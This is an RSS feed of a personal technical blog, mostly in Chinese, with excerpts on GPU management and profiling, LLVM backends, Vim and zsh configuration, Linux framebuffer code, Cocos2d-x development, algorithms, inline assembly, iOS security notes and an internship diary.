<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Zea&#39;s</title>
    <link>http://jhan.xyz/</link>
    <description>Recent content on Zea&#39;s</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Thu, 09 Aug 2018 00:00:00 +0000</lastBuildDate>
    
	<atom:link href="http://jhan.xyz/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>NVML API 笔记</title>
      <link>http://jhan.xyz/notes/gpu-nvml-api/</link>
      <pubDate>Thu, 09 Aug 2018 00:00:00 +0000</pubDate>
      
      <guid>http://jhan.xyz/notes/gpu-nvml-api/</guid>
      <description>NVML API The NVIDIA Management Library (NVML) 是一套监控和管理 NVIDIA GPU 的 C 接口。常用的 nvidia-smi 工具就是基于 NVML 实现的。
整体上 NVML 接口可分为五类：
 支持类接口：API 本身的初始化、状态清理等，猜测包含打开设备等，比较简单不再描述 查询类接口：查询各种状态 控制类接口：控制设备 事件处理类接口： 错误报告类接口：  查询类接口 查询接口又分为3小类
 System Queries Unit Queries Device Queries  System Queries 针对本地系统的查询，这一类查询接口与设备无关。包括查询 *Cuda驱动版本号*、*驱动版本号*、*NVML 版本号*、*进程名称*。
Unit Queries 这个是 S-Class GPU 专属的功能，一个 Unit 应该是可以包含多个 GPU 的外设（具体是什么没有深入研究），根据提供的接口来看 Unit 有独立的风扇、有 LED 和独立的温度检测，UnitInfo_t结构体中还包含固件版本等信息：
struct nvmlUnitInfo_t { char firmwareVersion[96]; // Firmware version. char id[96]; // Product identifier.</description>
    </item>
    
    <item>
      <title>NVidia Profiler</title>
      <link>http://jhan.xyz/notes/nvprofiler/</link>
      <pubDate>Thu, 09 Aug 2018 00:00:00 +0000</pubDate>
      
      <guid>http://jhan.xyz/notes/nvprofiler/</guid>
      <description>Profiler  nvprof  nvvp nsight   Metrics 分类 说明：以下多级列表中所涉及到的各种分类的统计项均为举例说明所用，并非完整列表，查看所有性能数据统计的完整列表请查看此链接。
整体分类：数量统计类、效率统计类、利用率统计类、overhead 统计类
整体的利用率  achieved_occupancy  Ratio of the average active warps per active cycle to the maximum number of warps supported on a multiprocessor   指令相关 指令执行数量统计  cf_executed  Number of executed control-flow instructions  flop_count_dp flop_count_dp_add inst_executed  指令发射数量统计  cf_issued  Number of issued control-flow instructions  inst_issued  指令执行统计数据  ipc ipc_instance  Instructions executed per cycle for a single multiprocessor  issued_ipc inst_per_warp  Average number of instructions executed by each warp   执行效率  branch_efficiency  Ratio of non-divergent branches to total branches expressed as percentage  flop_dp_efficiency gld_efficiency  指令执行单元利用等级  alu_fu_utilization cf_fu_utilization  The utilization level of the multiprocessor function units that execute control-flow instructions on a scale of 0 to 10   Overhead  inst_replay_overhead  Average number of replays for each instruction executed   Stalls 统计  stall_exec_dependency  Percentage of stalls occurring because an input required by the instruction is not yet available  stall_inst_fetch stall_memory_dependency stall_sync  内存相关 各种读、写、请求吞吐  atomic_throughput  Global memory atomic and reduction throughput  dram_read_throughput ecc_throughput gld_requested_throughput gld_throughput l2_l1_read_throughput  各种读、写、请求数量  atomic_transactions  Global memory atomic and reduction transactions  dram_read_transactions ecc_transactions gld_transactions  每个 request 内的平均数量计数  atomic_transactions_per_request  Average number of global memory atomic and reduction transactions performed for each atomic and reduction instruction  gld_transactions_per_request  一些利用等级统计  dram_utilization  The utilization level of the device memory relative to the peak utilization on a scale of 0 to 10  l2_utilization  Overhead  atomic_replay_overhead  Average number of replays due to atomic and reduction bank conflicts for each instruction executed  global_cache_replay_overhead  Cache 命中率  l2_l1_read_hit_rate  Hit rate at L2 cache for all read requests from L1 cache  l2_tex_read_hit_rate  数据大小统计  dram_write_bytes  Total bytes written from L2 cache to DRAM  pcie_total_data_received  Total data bytes received through PCIe  pcie_total_data_transmitted nvlink_user_data_received nvlink_user_data_transmitted  Metric 采集范围 每个 Metric 数据均有一个采集范围的概念，也就是说该性能数据在什么范围下是准确的，根据文档描述，共有三中范围：</description>
    </item>
    
    <item>
      <title>LLVM Sparc Load Mem Operand</title>
      <link>http://jhan.xyz/notes/llvm-sparc-load-mem-operand/</link>
      <pubDate>Mon, 26 Mar 2018 22:09:39 +0800</pubDate>
      
      <guid>http://jhan.xyz/notes/llvm-sparc-load-mem-operand/</guid>
      <description>Sparc Load指令基本格式是
ld [address], regrd  其中address域解释为
 The effective address for a load instruction is “r[rs1] + r[rs2]” if the i field is zero, or “r[rs1] + sign_ext(simm13)” if the i field is one.
 打印成ASM会是reg+reg或reg+imm两种形式之一。
SparcInstrInfo.td // Addressing modes. def ADDRrr : ComplexPattern&amp;lt;iPTR, 2, &amp;quot;SelectADDRrr&amp;quot;, [], []&amp;gt;; def ADDRri : ComplexPattern&amp;lt;iPTR, 2, &amp;quot;SelectADDRri&amp;quot;, [frameindex], []&amp;gt;; // Address operands def SparcMEMrrAsmOperand : AsmOperandClass { let Name = &amp;quot;MEMrr&amp;quot;; let ParserMethod = &amp;quot;parseMEMOperand&amp;quot;; } def SparcMEMriAsmOperand : AsmOperandClass { let Name = &amp;quot;MEMri&amp;quot;; let ParserMethod = &amp;quot;parseMEMOperand&amp;quot;; } def MEMrr : Operand&amp;lt;iPTR&amp;gt; { let PrintMethod = &amp;quot;printMemOperand&amp;quot;; let MIOperandInfo = (ops ptr_rc, ptr_rc); let ParserMatchClass = SparcMEMrrAsmOperand; } def MEMri : Operand&amp;lt;iPTR&amp;gt; { let PrintMethod = &amp;quot;printMemOperand&amp;quot;; let MIOperandInfo = (ops ptr_rc, i32imm); let ParserMatchClass = SparcMEMriAsmOperand; } .</description>
    </item>
    
    <item>
      <title>LLVM Encoding Asm Label</title>
      <link>http://jhan.xyz/post/llvm-encoding-asm-label/</link>
      <pubDate>Wed, 14 Mar 2018 14:40:01 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/llvm-encoding-asm-label/</guid>
      <description>汇编代码中的Label标记了一段汇编代码的起始地址，主要用在分支、跳转类的指令中， 一般汇编代码中的Label以字符串的形式出现，如：
bne r0, r1, __IF_THEN # 如果r0!=r1,跳转到__IF_THEN标记的代码段 jmp __IF_ELSE # 跳转到__IF_ELSE标记的代码段  其中__IF_THEN和__IF_ELSE分别标记了if语句的两个分支。 但是在实际的可执行文件中，Label并不存在，分支跳转指令中实际存储的是offset：
-Op- -Rs- -Rt- - offset - 1000 0000 0001 0000 0000 0000 0000 1000 # bne r0, r1, 8 # 目标指令与当前PC差为8个字节 # 跳过了一条jmp指令 -Op- - offset - 1001 0000 0000 0000 0000 0000 0010 1000 # jmp 40 # 跳过了9条指令  Label信息在编译初始阶段无法确定，直到最终完成编译的时候才会赋予其具体的值， 因此无法对Label进行静态的编码。 LLVM中使用fixup来处理这些在MCCodeEmitter中无法确定的信息。
以jmp $target指令为例，实现Label编码需要如下步骤：
 定义jtarget作为jmp指令的Operand:
def jtarget : Operand&amp;lt;OtherVT&amp;gt; { let EncoderMethod = &amp;quot;getJumpTargetOpValue&amp;quot;; }  这里要指明使用getJumpTargetOpValue()方法来对该Operand进行编码</description>
    </item>
    
    <item>
      <title>Zsh git prompt</title>
      <link>http://jhan.xyz/post/2016-06-30-zsh-git-prompt/</link>
      <pubDate>Thu, 30 Jun 2016 17:46:35 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2016-06-30-zsh-git-prompt/</guid>
      <description>之前在Zsh中手动添加了zsh-git-prompt插件， 不过一直存在一个问题，就是更换文件夹后$PROMPT中的$(git_super_status)变量不会自动更新， 必须重新执行source ~/.zshrc才行。
当时没有时间折腾，今天有时间仔细看了一下问题所在，原来是$PROMPT变量的设置有问题，原本的设置是：
PROMPT=&amp;quot;$(git_super_status) %# &amp;quot;  在这里，错误地使用了双引号，导致$(git_super_status)函数在赋值阶段就被字符串替换成了当时该函数的值， 因此之后即使更换文件夹，这个部分的显示内容也不会发生变化。双引号情况下$PROMPT变量实际的值：
(master|✚1) % echo $PROMPT (%{%}master%{%}|%{%}%{✚%G%}1%{%}%{%}) %#  可以看到$PROMPT中的$(git_super_status)已经被替换为(%{%}master%{%}|%{%}%{✚%G%}1%{%}%{%})， 故而每次显示的都是同样的内容。正确的做法是在.zshrc中使用单引号替代双引号， 保证脚本处理的时候不会对字符串内容进行替换，从而保留真正的内容，留待运行时再进行替换：
PROMPT=&#39;$(git_super_status) %# &#39;  (master|✚1) % echo $PROMPT $(git_super_status) %#  </description>
    </item>
    
    <item>
      <title>[转]windows下交换CapsLock和Ctrl键</title>
      <link>http://jhan.xyz/post/2015-09-14-win7-exchange-capslock-and-ctrl/</link>
      <pubDate>Mon, 14 Sep 2015 16:51:18 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2015-09-14-win7-exchange-capslock-and-ctrl/</guid>
      <description>更新：原文中交换的是Capslock键与左Ctrl键，实际中发现这样交换也不是很好用， 习惯性很容易按到L_CTRL从而打开了大写锁，因此更新为交换Capslock与R_CTRL， 更新后的Scancode Map文件为：
0000 00 00 00 00 00 00 00 00 0008 03 00 00 00 1d e0 3a 00 0010 3a 00 1d e0 00 00 00 00 0018  关于此Scancode Map的意义， 可以参考这篇文章， 详细的Scancode列表可以查看官方文档
原文地址：http://www.kodiva.com/post/swapping-caps-lock-and-control-keys
NOTE：原文描述该方法在 Windows XP，Windows Vista，Windows 7下可用，本人测试在Win10下亦可用
In our opinion this is the best way to swap the control and caps lock keys in Windows because you don&amp;rsquo;t have to rely on any external program and the registry edit works 100% perfectly (for the paranoid).</description>
    </item>
    
    <item>
      <title>Linux下VIM编码设置——解决中文乱码问题</title>
      <link>http://jhan.xyz/post/2015-08-27-xshell-vim-encoding/</link>
      <pubDate>Thu, 27 Aug 2015 18:31:48 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2015-08-27-xshell-vim-encoding/</guid>
      <description>日常工作与生活中经常需要在Windows下通过Xshell、Putty等SSH客户端远程连接Linux服务器， 在这种场景下使用Vim编辑器查看与录入中文经常会遇到乱码问题。 此外，网上也有很多文章提到过使用Vim将GBK编码的文件转换为UTF-8编码的方法， 这种文件编码的转换在远程Vim的情况下尤其应当小心操作，并提前备份，否则一旦转换失败可能再也难以恢复。 本文记录了一些远程Vim配置方面的心得，希望对大家有所帮助。
远程Vim的工作原理可以简单地理解为从文件读取数据，将数据从文件的存储编码转换到终端可识别的终端编码， 终端将数据流转发给SSH客户端，SSH客户端则根据客户端内配置的SSH客户端编码来对数据流解码，并将内容呈现给用户。 这三个编码我们最关心的是文件的存储编码，然而在配置的时候必须保证三个编码都配置正确，才能正确地显示和转换中文。
正确的配置（UTF-8） 废话少说，先来看正确的配置是怎样的，以及如何正确地配置。
首先，终端编码与SSH客户端编码需保持一致，客户端编码的查看与配置方法各有差异，在此不作分析；终端编码可通过如下命令查看：
locale charmap  如果不是UTF-8的话（默认为ISO-8859-1），可以通过修改环境变量LANG和LC_ALL来修改，将如下两行添加进.bashrc
export LANG=&#39;en_US.UTF-8&#39; export LC_ALL=&#39;en_US.UTF-8&#39;  这时再通过locale命令查看终端编码应该已经变成UTF-8了。
接下来要配置Vim，在正确地配置了终端编码为UTF-8之后，将下面一行添加进.vimrc即可：
set fencs=utf-8, gbk  注意：无需配置fenc、enc、tenc这三个变量！
至此，Vim显示中文的问题应该可以完美解决了！
Vim配置解析 前边快速地描述了应当如何配置Vim，但并未详细解释这几个选项的作用，但若要做到清楚明白地使用Vim转换文件编码， 了解这些选项的意义还是很有必要的。
Vim与编码相关的配置选项有四个，分别是fileencodings(fencs)，fileencoding(fenc)， encoding(enc)和termencoding(tenc)，其中 fencs为一个编码列表，当打开一个文件时，Vim会依次尝试利用列表中的编码去解读文件内容； fenc告诉Vim以哪种编码保存文件内容； enc告诉Vim将文件内容转为哪种编码存储在Vim工作缓冲区内； tenc告诉Vim将缓冲区内的编码转换为何种编码发送给终端。
当Vim打开一个文件的时候，会首先读取fencs列表，并尝试以第一个编码去解码文件内容，如果失败则继续尝试第二个， 直到找到一个解码成功的编码，并将fenc变量设为该编码。如果列表内的编码全部解码失败，则设置fenc变量为空字符串。
enc选项为Vim工作区内容编码，即Vim工作缓存内文件内容的编码， 该编码对用户并不可见，默认为ISO-8859-1（latin1），一般情况下不需要配置。 Vim打开文件时，会从fencs列表内匹配编码，并将文件内容从该编码转换为enc编码存储在Vim进程的内存里。
fenc为文件保存编码，当Vim存储一个文件时，会将工作内存内缓存的内容由enc编码转换为fenc编码，并写到相应的文件里。 需要注意的是fenc选项在Vim启动时会根据fencs设定，因此在.vimrc内配置fenc并没有意义， 一般只有在需要进行文件编码转换的时候会动态设定该选项的值。 如果fenc选项为空字符串，则默认使用enc选项所指定的编码保存文件。
tenc告诉Vim终端编码类型，Vim会将缓冲区内容由enc编码转换为tenc编码之后发送给终端渲染。 与fenc类似，如果tenc为空字符串，则不进行转换，直接输出enc编码到终端。
如果你对这些编码转来转去的感觉比较麻烦，一个简单不会出错的方法就是把这些全部都设为UTF-8，世界就清净了 (=
文件编码转换 在进行文件编码转换之前，最好保证上述配置都正确无误（都是UTF-8），并且你的Vim可以正确地解读目标文件编码内容， 简单来说就是fenc不是空字符串（这一点很重要，在后面会详细讲述），那么此时你的状态应当是，Vim知道源文件编码， 缓冲区内的编码为enc，此时若要进行编码转换，只需在Vim内执行命令（假设UTF-8转GBK）：
:set fenc=gbk  之后保存的时候，Vim就会自动将缓冲区内容从enc转到新的fenc编码保存了。
我能显示中文就是配置正确了么？ 答案当然是否定的，而且我就在这个问题上栽过跟头。
远程Vim过程中，可以“正常显示”中文意味着什么呢？答案是，终端发送给SSH客户端的数据被正确地解码了。 但是，这并不代表你的配置是正确的了，在这种场景下进行文件编码转换是非常危险的行为！
举一个配置错误、转换错误但是显示正常的例子吧。
LANG=&#39;en_US&#39; LC_ALL=&#39;en_US&#39; fencs=utf-8,gbk Xshell encoding=&#39;gbk&#39;  此时，终端编码为latin1，Vim内部编码亦为latin1，打开一个GBK编码的中文文件，中文却是可以正常显示的！ 其根本原因在于，GBK和latin1都是ASCII编码方式（使用latin1来解码GBK数据流并不会出错，只是会出现乱码）， 尝试用latin1编码打开GBK编码的文件并不会进行实质上的编码转换，终端把它认为是latin1编码的内容发送给Xshell， Xshell只要使用GBK编码解码，就依然可以正确地显示中文。</description>
    </item>
    
    <item>
      <title>Placeholder for Notes</title>
      <link>http://jhan.xyz/notes/placeholder/</link>
      <pubDate>Thu, 20 Aug 2015 17:46:35 +0800</pubDate>
      
      <guid>http://jhan.xyz/notes/placeholder/</guid>
      <description> Hello World </description>
    </item>
    
    <item>
      <title>Windows 下使用 Cocos2d-x 3.x &#43; Lua 开发基础</title>
      <link>http://jhan.xyz/post/2014-07-06-cocos2d-lua-basic/</link>
      <pubDate>Sun, 06 Jul 2014 10:59:17 -0700</pubDate>
      
      <guid>http://jhan.xyz/post/2014-07-06-cocos2d-lua-basic/</guid>
      <description>Cocos2d-x 是国内非常成熟的 2d 游戏开发引擎了，拥有非常广大的开发者群体和活跃的社区，支持 Windows、Linux、Mac OS、iOS、Android 和 Window Phone 等各个平台，其本身是用 C++ 语言实现的，主要提供了面向 C++ 的接口，也提供了对 Lua、object-c 和 JavaScript 的支持。我们的 minigame 要基于 Cocos（为简单起见，我就把 Cocos2d-x 称为 Cocos 了） 和 Lua 实现，这有好处也有弊端，Lua 作为一门脚本语言，开发起来确实非常快捷，不过 Cocos 社区 Lua 相关的文档和资料并不如 C++ 那么完备，使得上手的难度增加，而且 Lua 本质并不是面向对象的编程语言，我们编码时的一些 OO 的思想也要需要转变。
出于对自己记忆力的极端不信任，决定把实习期遇到的关于 Cocos + Lua 的种种问题都记录下来，希望也能成为实习的成果之一吧！
开发系统和工具 首先是环境的搭建，Cocos 的使用方法挺多的，取决于你的开发系统和开发工具，刚开始看的时候我自己也有些被搞乱了，说来搞笑，我基本上按照 Cocos 的安装说明文档去配置的，到最后用的最多的却是 Cocos-console。官方网站上各种开发工具环境搭建相关的文档还是很详细的，我在这里就不再重复了，主要是简单介绍一下用到的各种工具是干嘛的，还有就是不同的 Cocos 开发环境如何抉择的问题。
我自己的系统是 Windows 7，目标平台是 Android，因此本文主要讨论的问题是 Windows 平台下开发 Android 游戏的环境选择。官方网站上有比较详细的搭建 Cocos + Android 开发环境的文档，可以参考 How to run cpp-tests on Android (Terminal) 和 How to run cpp-tests on Android (Eclipse) 这两份文档，分别是在命令行下和 Eclipse 下开发 Android 游戏的环境配置步骤。总的来说，要在 Windows 上开发 Cocos + Lua 的 Android 游戏，我们需要准备如下东西，有点多，附上对每个工具的简单解释：</description>
    </item>
    
    <item>
      <title>暑期实习开始</title>
      <link>http://jhan.xyz/post/2014-07-05-summer-intern/</link>
      <pubDate>Sat, 05 Jul 2014 21:44:53 -0700</pubDate>
      
      <guid>http://jhan.xyz/post/2014-07-05-summer-intern/</guid>
      <description>记得很清楚，拿到网易暑期实习 offer 是 4 月 30 号，正好是劳动节放假前一天，当时真的是很开心，感觉实习终于有着落了，而且还是我的首选网易游戏，所以那个劳动节过的格外开心。实习从 7 月开始，6 月末收到公司邮件通知，从 6 月 29 号开始就可以去杭州报道了，这点不得不称赞网易，对实习生的待遇非常不错，公司食堂免费吃，还提供住宿，不过因为实习生较多，公司的宿舍不够用了，所以我被分在了公司附近的乐通酒店。去之前特意查了下地图，发现公司提供住宿的几家酒店里乐通是离得最近的，跟公司只隔了一个街区，走路 10 分钟妥妥儿的，这一点还是非常方便的。
我跟几个朋友一起，乘坐 29 号的火车来杭州，出了火车站几个人做的第一件事就是去办了张杭州一卡通，可以租自行车的那种，后来证明这个举动真是太明智了，因为我跟老缪出了地铁站之后就是租量小车慢慢悠悠骑到乐通的。我们就这样，骑着租来的橘黄色的小破车，拖着的拉杆箱，慢慢悠悠的开始了暑期杭州的日子。
初到乐通，一种大张江的即视感瞬间就让我泪流满面了，这环境，这布局，这没一个人影的大马路，还真是熟悉的场景，熟悉的味道。我们一行人中，只有我跟老缪住乐通，另外几个住另外一个酒店，虽然离公司较远，但是居然毗邻商圈，简直不能更惬意，于是当晚大家就约定去那个名叫“星光大道”的地方转一转。我跟老缪再次利用了杭州的自行车，一边拍大腿感慨真他妈方便一边来到了目的地，也就十几分钟，算不得很远。星光大道吃饭的地方还是不少的，还有之前跟蔚蔚一起吃过的非常好吃的老头儿油爆虾，感觉住在这边的孩子的生活质量真比我们高了好多，有点像张江和世纪大道的差别了。
6 月 30 号下暴雨，在宾馆闲着，顺便看看 cocos2d，毕竟马上实习开始就要用到，完全不会也说不过去。中午在宾馆门口发现大批黑暗料理，就吃了份鸡肉饭，晚上偷溜进公司食堂愉快的蹭了一顿饭，同时也从食堂门口的通告得知因为实习生和新员工入职，从 7 月 1 日起食堂二楼小锅菜临时改成大众餐厅了，当天是最后一天，很遗憾不能品尝一下网易的特色菜。吃完饭跑去食堂二楼参观，时候发现大家居然都在吃火锅，而且貌似是老北京涮羊肉那种铜锅！当时瞬间给网易加了一百分啊卧槽，可惜这些我们也是无缘享受的……吃完饭还去参观了篮球场，不得不说网易的木地板真心不错，比张江的好太多了，恨不得当时就上去打一场。
7 月 1 号正式开始在网易的暑期实习，头两天都没做什么事情，基本上就是入职讲座啊，认识一下导师啊，配配环境什么的，我做的主要事情就是在公司转了转，看看都有哪些玩儿的。体育馆、健身房、游戏室、射箭馆以及桌球房这些地方基本上都去了一遍，感觉公司活动还是蛮多的，到了周五晚上还会有分部门的烧烤、啤酒活动。 公司内部环境的话感觉还不错啦，座位跟实验室相比的话还是不如的，不过公共空间非常宽敞，来公司几天之后就发现游戏公司男女比例非常均衡，而且质量都不错，连平时专打 2 分和 3 分的老缪都给了好几个 7、8 分了，我们几个都在教唆他抓住实习机遇把个人问题解决了 (=
工作的话，我实习被分到了 minigame 项目，六人组队做一个小游戏出来，组内两名策划，三名程序，一名 QA，使用 cocos2d + lua 来实现。被分到这个项目组还是挺开心的，相当于提前感受了一把公司里面游戏项目迭代的过程，也有一些挑战性，毕竟 cocos2d 和 lua 我都不是很熟，两个月的时间要从头学起并做出一个实际的东西来，而且要和策划、QA 一起合作，挺新鲜好玩儿的。
加油！</description>
    </item>
    
    <item>
      <title>如何写 Ubuntu 的 Framebuffer</title>
      <link>http://jhan.xyz/post/2014-05-20-ubuntu-fbvnc/</link>
      <pubDate>Tue, 20 May 2014 20:26:25 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-05-20-ubuntu-fbvnc/</guid>
      <description>最近有个小项目，想在 Android 上跑一个通过直接读写 framebuffer 实现的 vnc 客户端， 所以发现了这个 fbvnc， 是 github 上一个小哥儿捣鼓的，基于现有的一个同名项目开发，专为嵌入式设备使用。这个小的 vnc 客户端的不足当然有很多，比如连基本的窗口都木有，直接占用了你整个 framebuffer，不能调整分辨率，巨慢无比，卡的紧了就直接挂，但是它有一个最大的优点，就是真的非常简单，除了一些基本的 Linux 库之外没有任何第三方的依赖。
以上算是个小广告吧 (=
但是一个很大的问题是，这货在 ubuntu 上不 work……什么原因呢，做个小测试看一看。
Ubuntu 下修改 Framebuffer 其实之前我写过小程序测试直接写 ubuntu 下的 framebuffer 的，当时也是神马效果都木有，当时只是猜测和 x11 或 unity 有关，也没深究，这次为了跑 fbvnc，特意去搜了下，后来在 这里 找到了解决方法：需要置上 FB_ACTIVATE_NOW 和 FB_ACTIVATE_FORCE 属性，具体代码如下：
vinfo.activate |= FB_ACTIVATE_NOW | FB_ACTIVATE_FORCE; ioctl(fbfd, FBIOPUT_VSCREENINFO, &amp;amp;vinfo)  加上这段代码之后，我写的测试程序终于可以看到修改屏幕的效果了！
#include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;linux/fb.h&amp;gt; #include &amp;lt;sys/mman.h&amp;gt; int main() { int fbfd = 0; struct fb_var_screeninfo vinfo; struct fb_fix_screeninfo finfo; long int screensize = 0; char *fbp = 0; int x = 0, y = 0，color = 255; long int location = 0; /* 打开 fb 设备文件 */ fbfd = open(&amp;quot;/dev/fb0&amp;quot;, O_RDWR); ioctl(fbfd, FBIOGET_FSCREENINFO, &amp;amp;finfo); ioctl(fbfd, FBIOGET_VSCREENINFO, &amp;amp;vinfo); /* 把 fb 映射到内存 */ screensize = vinfo.</description>
    </item>
    
    <item>
      <title>简单的递归和动态规划</title>
      <link>http://jhan.xyz/post/2014-04-05-recursion-and-dp/</link>
      <pubDate>Sat, 05 Apr 2014 13:31:50 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-04-05-recursion-and-dp/</guid>
      <description>题目：WordBreak 首先定义如下表示
str[n:m]为字符串 str 从下标 n 开始到下标 m-1 的字串
例如 str = &amp;ldquo;abcdef&amp;rdquo; str[4:6] = &amp;ldquo;ef&amp;rdquo;，str[1:3] = &amp;ldquo;bc&amp;rdquo;，str[3:4] = &amp;ldquo;d&amp;rdquo;
str[n:]为字符串从下标 n 开始直到字符串结束的子串
例如 str = &amp;ldquo;abcdef&amp;rdquo; str[2:] = ”cdef“
str[:m]为字符串从头开始直到下标 m-1 的子串
例如 str = &amp;ldquo;abcdef&amp;rdquo; str[:3] = ”abc“
stat[n]表示子串 str[n:] 能不能用字典中的单词表示
假设字符串长度是 L，那么字符下标从 0 到 L-1，定义 stat[L] = True （因为 str[L:] 是空字符串）
这道题的目标是计算 stat[0]，为了计算 stat[n]，我们有如下递归方程
stat[n] = { dict.contains( str[n:n+1] ) &amp;amp;&amp;amp; stat[n+1] } || { dict.contains( str[n:n+2] ) &amp;amp;&amp;amp; stat[n+2] } || .</description>
    </item>
    
    <item>
      <title>Linux 下 c 的扩展内联汇编</title>
      <link>http://jhan.xyz/post/2014-03-05-c-asm/</link>
      <pubDate>Wed, 05 Mar 2014 19:54:09 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-03-05-c-asm/</guid>
      <description>简单总结了一下自己看到用到的一些内联汇编的知识点，并不是一个完整的总结，以后对内联汇编有了新的了解会慢慢扩充。
详细细节可以参考 gcc 关与扩展内联汇编的 文档
格式说明 __asm__　__volatile__(&amp;quot;Instruction List&amp;quot; : Output : Input : Clobber/Modify)  冒号的使用原则（*O, I, C 分别指代 Output, Input, Clobber/Modify*）：
 C 为空，第三个冒号必须省略 O、I 为空时，前边的冒号（第一、二个）可选择性省略 O，I，C 中任何一个不为空，则之前的冒号均必须保留，如只有 I 不为空时，O 和 I 之前的冒号必须保留，只有 C 不为空时三个冒号都必须保留  合法的调用包括
__asm__(&amp;quot; &amp;quot; : : : &amp;quot;memory&amp;quot;); __asm__(&amp;quot; &amp;quot; : :); __asm__(&amp;quot;mov %1, %%eax&amp;quot; : &amp;quot;=a&amp;quot;(var_a)); __asm__(&amp;quot;mov %1, %%eax&amp;quot; : &amp;quot;=a&amp;quot;(var_a) :); __asm__(&amp;quot;mov %%edx, %%eax&amp;quot; : &amp;quot;=a&amp;quot;(var_a) : &amp;quot;d&amp;quot;(var_d)); __asm__(&amp;quot;mov %%edx, %%eax&amp;quot; : &amp;quot;=a&amp;quot;(var_a) : : &amp;quot;ebx&amp;quot;);  下面分别介绍指令列表、输出、输入和修改声明这四个部分。</description>
    </item>
    
    <item>
      <title>Notes on iOS Security Whitepaper</title>
      <link>http://jhan.xyz/post/2014-03-03-ios-security/</link>
      <pubDate>Mon, 03 Mar 2014 19:56:09 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-03-03-ios-security/</guid>
      <description>This notes is based on iOS Security - February 2014, origin link can be found here.
This paper gives a brief description of iOS security, including hardware security features and how iOS leverages these features.
System Security Secure Boot Chain ROM is sealed with public key of Apple Root CA, and will verify the Low-Level Bootloader (LLB) before load it.
For devices with an A7 processor, the Secure Enclave coprocessor also utilizes a secure boot process that ensures its separate software is verified and signed by Apple.</description>
    </item>
    
    <item>
      <title>Using theme Greyshade</title>
      <link>http://jhan.xyz/post/2014-02-27-using-theme-greyshade/</link>
      <pubDate>Thu, 27 Feb 2014 14:11:32 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-02-27-using-theme-greyshade/</guid>
      <description>Sometimes ago I came across a blog samwize, who uses a slightly modified theme called Greyshade, which I think is very beautiful, so I applied that theme immediately. Saddly this theme does not support chinese very well, so I made some customization myself.
Font and Size  add new font &amp;ldquo;Microsoft Yahei&amp;rdquo; for Chinese, add font &amp;ldquo;Consolas&amp;rdquo; for monospace enlarge the font size of an article enlarge the line height to make it comfortable to read Chinese  may be it is not large enough for Chinese, but I think it is too large for English enlarge the font size of meta info of an article decrease the font size for archieve view  Layout  abandon fixed width layout change the way meta info is displayed display meta info in the article view add Next and Prev link in the article view change a sharing provider remove the shadow below the sharing  Profile  use a local image instead of that of Gravatar.</description>
    </item>
    
    <item>
      <title>Vim Efficiency Notes</title>
      <link>http://jhan.xyz/post/2014-02-24-vim-notes/</link>
      <pubDate>Mon, 24 Feb 2014 15:00:00 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-02-24-vim-notes/</guid>
      <description>关于Vim的一些容易被忽视、却又能提升使用体验和操作效率的操作细节。同时记录Vim中一些（我见到过的）比较实用的配置，分享的同时也给自己留个备忘吧。 一下子总结不完整，慢慢更新。
基本操作 基本按照幸福感排序，排在前边的是我觉得用了之后一口气儿上五楼都不累的，稍微靠后一点排的就比较随意了。每一项第一行的*斜体字*是我认为该组合比较有用的场景。
使用Ctrl+[ 替代Esc，任何时候 Ctrl+[ 功能与Esc键完全相同，用这一快捷键的好处就不用解释了，大家都知道按Esc是件多么令人伤神的事情
X和x，任何时候 X 是退格（Backspace），x 是删除（Delete）
使用Ctrl+e 和 Ctrl+y逐行翻滚页面，阅读（代码） 这两个组合非常有用，作用分别是维持当前坐标位置不变，页面上滚和下滚一行
** #和* **，阅读代码 #（shift+3）用来向上搜索当前光标所在单词，*（shift+8）用来向下搜索
%，阅读代码 在相对应的两个括号之间跳转，当一段函数体非常长的时候能方便的从反括号跳至函数/循环/if等结构的开始处
+ 和 - + 的功能是跳转到下一行行首，与之相对应，- 是跳转到上一行行首
J 删除行末换行符，在把多行连接成一行时非常有用
zz和zt，阅读 将光标所在行置于屏幕中间/顶部，阅读代码时比较有用
H，M 和 L, 代码、文章编辑 H，M和L（注意是大写）用来将光标快速移动到当前屏幕的最顶行/中间行/最底行
使用m 和` （Esc下边那个按键）进行标记和跳转 先按m，然后随意输入一个字母，就能用该字母标记当前行，之后在当前文件任意位置可以按 ` + 之前标记的字母快速跳转到这一行。在被标记的行按m，加同样的字母可以取消标记，如果连续按两次`，则光标会在当前位置，和上一次的跳转位置之间来回切换 此外，这里还可以使用*单引号*代替反引号，他们俩的功能是一样一样的
A 和 I A 是在本行行尾插入，I 是在本行行首插入。
Ctrl+a和Ctrl+x 将当前光标所在位置处的数字加1/减1，比较好玩儿的命令，一般用不到，不过用到的话确实很方便
配置 wildmode, wildmenu 输入命令:set wildmode=list:longest,full和:set wildmenu，在vim窗口下方会出现一条menu，当需要补全的时候（例如:e命令打开新文件，或者输入:s后希望模糊搜索所有s开头的vim命令），按Tab键时自动补全时行为会变为：
 出现一个list，为当前目录下所有文件，此时可进行并再次按Tab补全 跳至列表第一个选项，或者（如果第1步中输入了文件开头字母）自动补全当前输入  默认行为没有步骤1，直接跳转第一个选项，而且不会显示整体列表，使用起来体验极差。</description>
    </item>
    
    <item>
      <title>Notes on Paxos Made Simple</title>
      <link>http://jhan.xyz/post/2014-02-12-paxos/</link>
      <pubDate>Wed, 12 Feb 2014 16:21:02 +0800</pubDate>
      
      <guid>http://jhan.xyz/post/2014-02-12-paxos/</guid>
      <description>Origin paper link
Problem safety requirements
